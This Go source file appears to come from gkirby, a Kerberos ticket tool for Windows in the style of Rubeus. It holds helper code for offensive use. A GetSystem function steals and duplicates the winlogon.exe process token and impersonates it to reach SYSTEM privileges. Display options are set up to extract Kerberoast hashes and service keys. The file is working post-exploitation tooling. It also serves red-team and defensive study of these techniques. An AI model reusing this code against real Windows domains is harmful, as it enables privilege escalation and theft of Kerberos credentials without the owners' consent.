package helpers

import (
	"fmt"
	"time"
	"unsafe"

	"github.com/ziggoon/gkirby/dll"
	"golang.org/x/sys/windows"
)

const (
	windowsToUnixEpochIntervals = 116444736000000000
)

const (
	ProcessQueryInformation = 0x0400
	ProcessVmRead           = 0x0010
)

type DisplayOptions struct {
	IndentLevel           int
	DisplayTGT            bool
	DisplayB64Ticket      bool
	ExtractKerberoastHash bool
	NoWrap                bool
	ServiceKey            []byte
	AsrepKey              []byte
	ServiceUser           string
	ServiceDomain         string
	KrbKey                []byte
	KeyList               []byte
	DesPlainText          string
}

type TicketDisplayFormat int

const (
	Triage TicketDisplayFormat = iota
	Klist
	Full
)

func DefaultDisplayOptions() *DisplayOptions {
	return &DisplayOptions{
		IndentLevel:           2,
		DisplayTGT:            false,
		DisplayB64Ticket:      false,
		ExtractKerberoastHash: true,
		NoWrap:                false,
	}
}

func GetSystem() {
	isHighIntegrity, err := IsHighIntegrity()
	if err != nil {
		return
	}

	if !isHighIntegrity {
		return
	}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))
	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return
	}

	for {
		processName := windows.UTF16ToString(procEntry.ExeFile[:])
		if processName == "winlogon.exe" {
			handle, err := windows.OpenProcess(
				ProcessQueryInformation|ProcessVmRead,
				false,
				procEntry.ProcessID,
			)
			if err != nil {
				return
			}
			defer windows.CloseHandle(handle)

			fmt.Printf("winlogon handle obtained\n")

			var token windows.Token
			err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
			if err != nil {
				return
			}
			defer token.Close()

			fmt.Printf("token obtained: %v\n", token)

			var duplicateToken windows.Token
			err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &duplicateToken)
			if err != nil {
				fmt.Printf("DuplicateTokenEx failed: %v", err)
				return
			}
			defer duplicateToken.Close()

			fmt.Printf("duplicateToken: %v\n", duplicateToken)

			ret, _, err := dll.ImpersonateLoggedOnUser.Call(uintptr(duplicateToken))
			if ret == 0 {
				return
			}

			isSystem, err := IsSystem()
			if err != nil || !isSystem {
				return
			} else {
				return
			}
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return
		}
	}
	return
}

func IsSystem() (bool, error) {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	user, err := token.GetTokenUser()
	if err != nil {
		return false, fmt.Errorf("GetTokenUser failed: %v", err)
	}

	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
	}

	fmt.Printf("systemSid: %v\n", systemSid)
	fmt.Printf("user sid: %v\n", user.User.Sid)
	fmt.Printf("equal?: %v\n", windows.EqualSid(user.User.Sid, systemSid))

	return windows.EqualSid(user.User.Sid, systemSid), nil
}

func IsHighIntegrity() (bool, error) {
	var token windows.Token
	h := windows.CurrentProcess()
	err := windows.OpenProcessToken(h, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false, err
	}
	defer token.Close()

	var isElevated uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &returnedLen)
	if err != nil {
		return false, err
	}

	return isElevated != 0, nil
}

func FileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - windowsToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}
